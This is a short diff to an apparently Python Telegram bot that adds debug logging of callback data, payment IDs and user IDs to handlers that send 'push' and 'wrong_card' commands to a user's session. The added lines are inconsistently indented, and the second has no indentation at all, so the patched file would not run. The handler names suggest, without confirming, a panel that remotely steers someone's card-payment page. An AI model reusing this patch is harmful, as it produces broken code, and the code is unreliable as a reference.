@@ -508,6 +508,7 @@ async def push_handler(callback: types.CallbackQuery):
     parts = callback.data.split("_")
     payment_id = parts[1]
     user_id = parts[2]  # ← БЕРЕМ user_id ИЗ CALLBACK_DATA
+     logger.info(f"🔧 DEBUG: callback_data={callback.data}, payment_id={payment_id}, user_id={user_id}")
     
     success = await send_sse_command(user_id, "push", payment_id)
     
@@ -523,6 +524,7 @@ async def wrong_card_handler(callback: types.CallbackQuery):
     parts = callback.data.split("_")
     payment_id = parts[1]
     user_id = parts[2]  # ← БЕРЕМ user_id ИЗ CALLBACK_DATA
+ logger.info(f"🔧 DEBUG: callback_data={callback.data}, payment_id={payment_id}, user_id={user_id}")
     
     success = await send_sse_command(user_id, "wrong_card", payment_id)
     
@@ -899,6 +901,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
